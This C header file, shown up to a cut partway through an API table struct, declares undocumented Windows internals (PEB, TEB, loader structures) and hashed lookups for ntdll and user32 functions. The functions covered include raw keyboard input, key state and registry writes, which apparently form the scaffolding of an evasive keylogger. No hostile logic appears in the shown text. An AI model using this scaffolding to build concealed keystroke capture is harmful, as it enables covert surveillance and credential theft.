#pragma once

#include <windows.h>
#include <stdio.h>
#include <Psapi.h>

//#define WIN32_LEAN_AND_MEAN

#define OBJ_KERNEL_HANDLE 0x00000200
#define InMemoryOrderModuleListDelta 16
#define WMAX_PATH (MAX_PATH * sizeof(WCHAR))
#define WM_PASS_STRUCTURE (WM_USER + 0x0001)
#define DATA_RECORD(Address, Type, Field)((Type *)(((ULONG_PTR)Address) - (ULONG_PTR)(&(((Type *)0)->Field))))
#define TEB_OFFSET(Teb, Field)((LONG)(LONG_PTR)&(((Teb*) 0)->Field))
#define OBJ_CASE_INSENSITIVE 0x00000040L

#define FILE_SUPERSEDE                    0x00000000
#define FILE_OPEN                         0x00000001
#define FILE_CREATE                       0x00000002
#define FILE_OPEN_IF                      0x00000003
#define FILE_OVERWRITE                    0x00000004
#define FILE_OVERWRITE_IF                 0x00000005
#define FILE_MAXIMUM_DISPOSITION          0x00000005

#define FILE_DIRECTORY_FILE               0x00000001
#define FILE_WRITE_THROUGH                0x00000002
#define FILE_SEQUENTIAL_ONLY              0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING    0x00000008
#define FILE_SYNCHRONOUS_IO_ALERT         0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT      0x00000020
#define FILE_NON_DIRECTORY_FILE           0x00000040
#define FILE_CREATE_TREE_CONNECTION       0x00000080
#define FILE_COMPLETE_IF_OPLOCKED         0x00000100
#define FILE_NO_EA_KNOWLEDGE              0x00000200
#define FILE_OPEN_REMOTE_INSTANCE         0x00000400
#define FILE_RANDOM_ACCESS                0x00000800
#define FILE_DELETE_ON_CLOSE              0x00001000
#define FILE_OPEN_BY_FILE_ID              0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT       0x00004000
#define FILE_NO_COMPRESSION               0x00008000
#if (NTDDI_VERSION >= NTDDI_WIN7)
#define FILE_OPEN_REQUIRING_OPLOCK        0x00010000
#define FILE_DISALLOW_EXCLUSIVE           0x00020000
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */
#define FILE_RESERVE_OPFILTER             0x00100000
#define FILE_OPEN_REPARSE_POINT           0x00200000
#define FILE_OPEN_NO_RECALL               0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY    0x00800000


typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	ULONG                   Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBase;
	PPEB_LDR_DATA           LoaderData;
	PVOID                   ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PVOID                   FastPebLockRoutine;
	PVOID                   FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID*                  KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PVOID                   FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID*                  ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID**          		  ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, *PPEB;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR  Buffer;
} ANSI_STRING, *PANSI_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
	WORD Flags;
	WORD Length;
	ULONG TimeStamp;
	ANSI_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _CURDIR {
	UNICODE_STRING DosPath;
	PVOID Handle;
}CURDIR, *PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	PVOID ConsoleHandle;
	ULONG ConsoleFlags;
	PVOID StandardInput;
	PVOID StandardOutput;
	PVOID StandardError;
	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	ULONG EnvironmentSize;
}RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _IO_APC_ROUTINE {
	VOID            *ApcContext;
	PIO_STATUS_BLOCK IoStatusBlock;
	ULONG		     Reserved;
} IO_APC_ROUTINE, *PIO_APC_ROUTINE;

typedef NTSTATUS(NTAPI *PRTL_HEAP_COMMIT_ROUTINE)(PVOID, PVOID*, PSIZE_T);
typedef struct _RTL_HEAP_PARAMETERS {
	ULONG Length;
	SIZE_T SegmentReserve;
	SIZE_T SegmentCommit;
	SIZE_T DeCommitFreeBlockThreshold;
	SIZE_T DeCommitTotalFreeThreshold;
	SIZE_T MaximumAllocationSize;
	SIZE_T VirtualMemoryThreshold;
	SIZE_T InitialCommit;
	SIZE_T InitialReserve;
	PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;
	SIZE_T Reserved[2];
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
	ULONG TitleIndex;
	ULONG Type;
	ULONG NameLength;
	WCHAR Name[1];
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
	ULONG TitleIndex;
	ULONG Type;
	ULONG DataOffset;
	ULONG DataLength;
	ULONG NameLength;
	WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
	ULONG TitleIndex;
	ULONG Type;
	ULONG DataLength;
	UCHAR Data[1];
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
	KeyValueBasicInformation = 0,
	KeyValueFullInformation,
	KeyValuePartialInformation,
	KeyValueFullInformationAlign64,
	KeyValuePartialInformationAlign64,
	MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_FULL_INFORMATION {
	LARGE_INTEGER LastWriteTime;
	ULONG         TitleIndex;
	ULONG         ClassOffset;
	ULONG         ClassLength;
	ULONG         SubKeys;
	ULONG         MaxNameLen;
	ULONG         MaxClassLen;
	ULONG         Values;
	ULONG         MaxValueNameLen;
	ULONG         MaxValueDataLen;
	WCHAR         Class[1];
} KEY_FULL_INFORMATION, *PKEY_FULL_INFORMATION;

typedef enum _KEY_INFORMATION_CLASS {
	KeyBasicInformation = 0,
	KeyNodeInformation = 1,
	KeyFullInformation = 2,
	KeyNameInformation = 3,
	KeyCachedInformation = 4,
	KeyFlagsInformation = 5,
	KeyVirtualizationInformation = 6,
	KeyHandleTagsInformation = 7,
	MaxKeyInfoClass = 8
} KEY_INFORMATION_CLASS;

typedef struct _FILE_POSITION_INFORMATION {
	LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION {
	LARGE_INTEGER AllocationSize;
	LARGE_INTEGER EndOfFile;
	ULONG         NumberOfLinks;
	BOOLEAN       DeletePending;
	BOOLEAN       Directory;
} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;

typedef enum _FILE_INFORMATION_CLASS {
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,
	FileBothDirectoryInformation,
	FileBasicInformation,
	FileStandardInformation,
	FileInternalInformation,
	FileEaInformation,
	FileAccessInformation,
	FileNameInformation,
	FileRenameInformation,
	FileLinkInformation,
	FileNamesInformation,
	FileDispositionInformation,
	FilePositionInformation,
	FileFullEaInformation,
	FileModeInformation,
	FileAlignmentInformation,
	FileAllInformation,
	FileAllocationInformation,
	FileEndOfFileInformation,
	FileAlternateNameInformation,
	FileStreamInformation,
	FilePipeInformation,
	FilePipeLocalInformation,
	FilePipeRemoteInformation,
	FileMailslotQueryInformation,
	FileMailslotSetInformation,
	FileCompressionInformation,
	FileObjectIdInformation,
	FileCompletionInformation,
	FileMoveClusterInformation,
	FileQuotaInformation,
	FileReparsePointInformation,
	FileNetworkOpenInformation,
	FileAttributeTagInformation,
	FileTrackingInformation,
	FileIdBothDirectoryInformation,
	FileIdFullDirectoryInformation,
	FileValidDataLengthInformation,
	FileShortNameInformation,
	FileIoCompletionNotificationInformation,
	FileIoStatusBlockRangeInformation,
	FileIoPriorityHintInformation,
	FileSfioReserveInformation,
	FileSfioVolumeInformation,
	FileHardLinkInformation,
	FileProcessIdsUsingFileInformation,
	FileNormalizedNameInformation,
	FileNetworkPhysicalNameInformation,
	FileIdGlobalTxDirectoryInformation,
	FileIsRemoteDeviceInformation,
	FileUnusedInformation,
	FileNumaNodeInformation,
	FileStandardLinkInformation,
	FileRemoteProtocolInformation,
	FileRenameInformationBypassAccessCheck,
	FileLinkInformationBypassAccessCheck,
	FileVolumeNameInformation,
	FileIdInformation,
	FileIdExtdDirectoryInformation,
	FileReplaceCompletionInformation,
	FileHardLinkFullIdInformation,
	FileIdExtdBothDirectoryInformation,
	FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef struct _FILE_BASIC_INFORMATION {
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	ULONG         FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

typedef struct _RTLP_CURDIR_REF {
	LONG RefCount;
	HANDLE Handle;
}RTLP_CURDIR_REF, *PRTLP_CURDIR_REF;

typedef struct _RTL_RELATIVE_NAME_U {
	UNICODE_STRING RelativeName;
	HANDLE ContainingDirectory;
	PRTLP_CURDIR_REF CurDirRef;
}RTL_RELATIVE_NAME_U, *PRTL_RELATIVE_NAME_U;

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation,
	ProcessQuotaLimits,
	ProcessIoCounters,
	ProcessVmCounters,
	ProcessTimes,
	ProcessBasePriority,
	ProcessRaisePriority,
	ProcessDebugPort,
	ProcessExceptionPort,
	ProcessAccessToken,
	ProcessLdtInformation,
	ProcessLdtSize,
	ProcessDefaultHardErrorMode,
	ProcessIoPortHandlers,          // Note: this is kernel mode only
	ProcessPooledUsageAndLimits,
	ProcessWorkingSetWatch,
	ProcessUserModeIOPL,
	ProcessEnableAlignmentFaultFixup,
	ProcessPriorityClass,
	ProcessWx86Information,
	ProcessHandleCount,
	ProcessAffinityMask,
	ProcessPriorityBoost,
	ProcessDeviceMap,
	ProcessSessionInformation,
	ProcessForegroundInformation,
	ProcessWow64Information,
	ProcessImageFileName,
	ProcessLUIDDeviceMapsEnabled,
	ProcessBreakOnTermination,
	ProcessDebugObjectHandle,
	ProcessDebugFlags,
	ProcessHandleTracing,
	ProcessIoPriority,
	ProcessExecuteFlags,
	ProcessTlsInformation,
	ProcessCookie,
	ProcessImageInformation,
	ProcessCycleTime,
	ProcessPagePriority,
	ProcessInstrumentationCallback,
	ProcessThreadStackAllocation,
	ProcessWorkingSetWatchEx,
	ProcessImageFileNameWin32,
	ProcessImageFileMapping,
	ProcessAffinityUpdateMode,
	ProcessMemoryAllocationMode,
	ProcessGroupInformation,
	ProcessTokenVirtualizationEnabled,
	ProcessConsoleHostProcess,
	ProcessWindowInformation,
	ProcessHandleInformation,
	ProcessMitigationPolicy,
	ProcessDynamicFunctionTableInformation,
	ProcessHandleCheckingMode,
	ProcessKeepAliveCount,
	ProcessRevokeFileHandles,
	ProcessWorkingSetControl,
	MaxProcessInfoClass             // MaxProcessInfoClass should always be the last enum
} PROCESSINFOCLASS;

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	_ACTIVATION_CONTEXT * EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef LONG KPRIORITY;
typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct __CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
}CLIENT_ID, *PCLIENT_ID;

typedef PVOID PACTIVATION_CONTEXT;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
	struct __RTL_ACTIVATION_CONTEXT_STACK_FRAME *Previous;
	PACTIVATION_CONTEXT ActivationContext;
	ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, *PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK {
	PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
	LIST_ENTRY FrameListCache;
	ULONG Flags;
	ULONG NextCookieSequenceNumber;
	ULONG StackId;
} ACTIVATION_CONTEXT_STACK, *PACTIVATION_CONTEXT_STACK;

typedef struct _GDI_TEB_BATCH {
	ULONG Offset;
	ULONG HDC;
	ULONG Buffer[310];
} GDI_TEB_BATCH, *PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
	ULONG Flags;
	PCHAR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
	ULONG Flags;
	struct _TEB_ACTIVE_FRAME *Previous;
	PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

typedef struct _TEB
{
	NT_TIB         NtTib;
	PVOID             EnvironmentPointer;
	CLIENT_ID      ClientId;
	PVOID             ActiveRpcHandle;
	PVOID             ThreadLocalStoragePointer;
	PPEB      ProcessEnvironmentBlock;
	ULONG                  LastErrorValue;
	ULONG                  CountOfOwnedCriticalSections;
	PVOID             CsrClientThread;
	PVOID             Win32ThreadInfo;
	ULONG                  User32Reserved[26];
	ULONG                  UserReserved[5];
	PVOID             WOW32Reserved;
	LCID                   CurrentLocale;
	ULONG                  FpSoftwareStatusRegister;
	PVOID             SystemReserved1[54];
	LONG                   ExceptionCode;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PACTIVATION_CONTEXT_STACK* ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x30 - 3 * sizeof(PVOID)];
	ULONG                  TxFsContext;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x34 - 3 * sizeof(PVOID)];
#else
	ACTIVATION_CONTEXT_STACK ActivationContextStack;
	UCHAR                  SpareBytes1[24];
#endif
	GDI_TEB_BATCH  GdiTebBatch;
	CLIENT_ID      RealClientId;
	PVOID            GdiCachedProcessHandle;
	ULONG                  GdiClientPID;
	ULONG                  GdiClientTID;
	PVOID             GdiThreadLocalInfo;
	PSIZE_T            Win32ClientInfo[62];
	PVOID             glDispatchTable[233];
	PSIZE_T            glReserved1[29];
	PVOID             glReserved2;
	PVOID             glSectionInfo;
	PVOID             glSection;
	PVOID             glTable;
	PVOID             glCurrentRC;
	PVOID             glContext;
	NTSTATUS               LastStatusValue;
	UNICODE_STRING StaticUnicodeString;
	WCHAR                  StaticUnicodeBuffer[261];
	PVOID             DeallocationStack;
	PVOID             TlsSlots[64];
	LIST_ENTRY     TlsLinks;
	PVOID             Vdm;
	PVOID             ReservedForNtRpc;
	PVOID             DbgSsReserved[2];
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                  HardErrorMode;
#else
	ULONG                  HardErrorsAreDisabled;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID             Instrumentation[13 - sizeof(GUID) / sizeof(PVOID)];
	GUID                   ActivityId;
	PVOID             SubProcessTag;
	PVOID             EtwLocalData;
	PVOID             EtwTraceData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PVOID             Instrumentation[14];
	PVOID             SubProcessTag;
	PVOID             EtwLocalData;
#else
	PVOID             Instrumentation[16];
#endif
	PVOID             WinSockData;
	ULONG                  GdiBatchCount;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	BOOLEAN                SpareBool0;
	BOOLEAN                SpareBool1;
	BOOLEAN                SpareBool2;
#else
	BOOLEAN                InDbgPrint;
	BOOLEAN                FreeStackOnTermination;
	BOOLEAN                HasFiberData;
#endif
	UCHAR                  IdealProcessor;
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                  GuaranteedStackBytes;
#else
	ULONG                  Spare3;
#endif
	PVOID             ReservedForPerf;
	PVOID             ReservedForOle;
	ULONG                  WaitingOnLoaderLock;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID             SavedPriorityState;
	ULONG_PTR         SoftPatchPtr1;
	ULONG_PTR         ThreadPoolData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	ULONG_PTR         SparePointer1;
	ULONG_PTR         SoftPatchPtr1;
	ULONG_PTR         SoftPatchPtr2;
#else
	Wx86ThreadState        Wx86Thread;
#endif
	PVOID*            TlsExpansionSlots;
#if defined(_WIN64) && !defined(EXPLICIT_32BIT)
	PVOID             DeallocationBStore;
	PVOID             BStoreLimit;
#endif
	ULONG                  ImpersonationLocale;
	ULONG                  IsImpersonating;
	PVOID             NlsCache;
	PVOID             pShimData;
	ULONG                  HeapVirtualAffinity;
	HANDLE            CurrentTransactionHandle;
	PTEB_ACTIVE_FRAME ActiveFrame;
#if (NTDDI_VERSION >= NTDDI_WS03)
	PVOID FlsData;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID PreferredLangauges;
	PVOID UserPrefLanguages;
	PVOID MergedPrefLanguages;
	ULONG MuiImpersonation;
	union
	{
		struct
		{
			USHORT SpareCrossTebFlags : 16;
		};
		USHORT CrossTebFlags;
	};
	union
	{
		struct
		{
			USHORT DbgSafeThunkCall : 1;
			USHORT DbgInDebugPrint : 1;
			USHORT DbgHasFiberData : 1;
			USHORT DbgSkipThreadAttach : 1;
			USHORT DbgWerInShipAssertCode : 1;
			USHORT DbgIssuedInitialBp : 1;
			USHORT DbgClonedThread : 1;
			USHORT SpareSameTebBits : 9;
		};
		USHORT SameTebFlags;
	};
	PVOID TxnScopeEntercallback;
	PVOID TxnScopeExitCAllback;
	PVOID TxnScopeContext;
	ULONG LockCount;
	ULONG ProcessRundown;
	ULONG64 LastSwitchTime;
	ULONG64 TotalSwitchOutTime;
	LARGE_INTEGER WaitReasonBitMap;
#else
	BOOLEAN SafeThunkCall;
	BOOLEAN BooleanSpare[3];
#endif
} TEB, *PTEB;
#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

//api table hashes
#define pRtlInitUnicodeString 0x29b75f89
typedef VOID(NTAPI *RTLINITUNICODESTRING) (PUNICODE_STRING, PWCHAR);

#define pLdrLoadDll 0x307db23
typedef NTSTATUS(NTAPI *LDRLOADDLL) (PWCHAR, DWORD, PUNICODE_STRING, PHANDLE);

#define pRtlAllocateHeap 0xc0b381da //done
typedef PVOID(NTAPI *RTLALLOCATEHEAP) (PVOID, ULONG, SIZE_T);

#define pRtlFreeHeap 0x70ba71d7 //done
typedef BOOL(NTAPI *RTLFREEHEAP)(PVOID, ULONG, PVOID);

#define pRtlGetLastWin32Error 0xb65b7508 //DONE
typedef DWORD(NTAPI *RTLGETLASTWIN32ERROR)(VOID);

#define pNtCreateFile 0x15a5ecdb //done
typedef NTSTATUS(NTAPI *NTCREATEFILE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

#define pNtWriteFile 0xd69326b2 //done
typedef NTSTATUS(NTAPI *NTWRITEFILE)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);

#define pNtClose 0x8b8e133d //done
typedef NTSTATUS(NTAPI *NTCLOSE)(HANDLE);

#define pRtlFreeUnicodeString 0x9c1d3997
typedef VOID(NTAPI *RTLFREEUNICODESTRING)(PUNICODE_STRING);

#define pZwClose 0x2e48662c
typedef NTSTATUS(NTAPI *ZWCLOSE)(HANDLE);

#define pNtQueryInformationFile 0x4725f863 //done
typedef NTSTATUS(NTAPI *NTQUERYINFORMATIONFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);

#define pNtSetInformationFile 0x6e88b479 //done
typedef NTSTATUS(NTAPI *NTSETINFORMATIONFILE) (HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);

#define pRtlTimeToSecondsSince1970 0xcd0d8a7b
typedef BOOL(WINAPI *RTLTIMETOSECONDSSINCE1970)(PLARGE_INTEGER, PULONG);

#define pCreateProcessW 0xaeb52e2f
typedef BOOL(WINAPI *CREATEPROCESSW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

#define pNtOpenProcessTokenEx 0xb1bef7f6
typedef NTSTATUS(NTAPI *NTOPENPROCESSTOKENEX)(HANDLE, ACCESS_MASK, ULONG, PHANDLE);

#define pNtQueryInformationToken 0x2ce5a244
typedef NTSTATUS(NTAPI *NTQUERYINFORMATIONTOKEN)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);

#define pRtlValidSid 0x28e54487
typedef BOOL(NTAPI *RTLVALIDSID)(PSID);

#define pRtlConvertSidToUnicodeString 0xbf34cf19
typedef NTSTATUS(NTAPI *RTLCONVERTSIDTOUNICODESTRING)(PUNICODE_STRING, PVOID, BOOL);

#define pZwOpenKey 0x865208b1
typedef NTSTATUS(NTAPI *ZWOPENKEY)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

#define pZwSetValueKey 0x407bdd88
typedef NTSTATUS(NTAPI *ZWSETVALUEKEY)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);

#define pNtReadFile 0x2e979ae3
typedef NTSTATUS(NTAPI *NTREADFILE)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);

#define pRtlDosPathNameToNtPathName_U 0xbfe457b2
typedef NTSTATUS(NTAPI *RTLDOSPATHNAMETONTPATHNAME_U)(PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U);

#define pZwCreateKey 0xaa377cf3
typedef NTSTATUS(NTAPI *ZWCREATEKEY)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);

#define pNtQueryInformationProcess 0xd034fc62
typedef NTSTATUS(NTAPI *NTQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

#define pRtlNtStatusToDosError 0x35abf270
typedef ULONG(WINAPI *RTLNTSTATUSTODOSERROR)(NTSTATUS);

#define pNtReadVirtualMemory 0xc24062e3
typedef BOOL(NTAPI *NTREADVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

/*
User-mode User32.dll API imports
*/

#define pRegisterClassExW 0x932eb094
typedef ATOM(WINAPI *REGISTERCLASSEX)(CONST WNDCLASSEX*);

#define pCreateWindowEx 0x1c82e285
typedef HWND(WINAPI *CREATEWINDOWEX)(DWORD, LPCWSTR, LPCWSTR, DWORD, INT, INT, INT, INT, HWND, HMENU, HINSTANCE, LPVOID);

#define pSendMessageW 0x9564448b
typedef LRESULT(WINAPI *SENDMESSAGE)(HWND, UINT, WPARAM, LPARAM);

#define pGetMessageW 0xcbceb9c1
typedef BOOL(WINAPI *GETMESSAGE)(LPMSG, HWND, UINT, UINT);

#define pTranslateMessage 0xe5425a58 
typedef BOOL(WINAPI *TRANSLATEMESSAGE)(CONST MSG*);

#define pDispatchMessage 0xaba06071
typedef LRESULT(WINAPI *DISPATCHMESSAGE)(CONST MSG*);

#define pRegisterRawInputDevices 0xfb1c9307
typedef BOOL(WINAPI *REGISTERRAWINPUTDEVICES)(PCRAWINPUTDEVICE, UINT, UINT);

#define pGetKeyState 0xff11474f
typedef SHORT(WINAPI *GETKEYSTATE)(INT);

#define pToAscii 0x4da125f1
typedef INT(WINAPI *TOASCII)(UINT, UINT, CONST PBYTE, LPWORD, UINT);

#define pGetKeyNameTextW 0xd2649c2b
typedef INT(WINAPI *GETKEYNAMETEXTW)(LONG, LPWSTR, INT);

#define pMapVirtualKeyW 0xd75b53ea
typedef UINT(WINAPI *MAPVIRTUALKEYW)(UINT, UINT);

#define pGetKeyboardState 0xc8431437
typedef BOOL(WINAPI *GETKEYBOARDSTATE)(PBYTE);

#define pDestroyWindow 0x14841e87
typedef BOOL(WINAPI *DESTROYWINDOW)(HWND);

#define pDefWindowProcW 0x68f05e57
typedef LRESULT(WINAPI *DEFWINDOWPROCW)(HWND, UINT, WPARAM, LPARAM);





typedef struct _FILENAME_TABLE {
	WCHAR g_szClassName[MAX_PATH];
	WCHAR g_szModuleName[MAX_PATH];
	WCHAR g_szFileName[MAX_PATH];
}FILENAME_TABLE, *PFILENAME_TABLE;

typedef struct __APITABLE {
	RTLINITUNICODESTRING RtlInitUnicodeString;
	LDRLOADDLL LdrLoadDll;
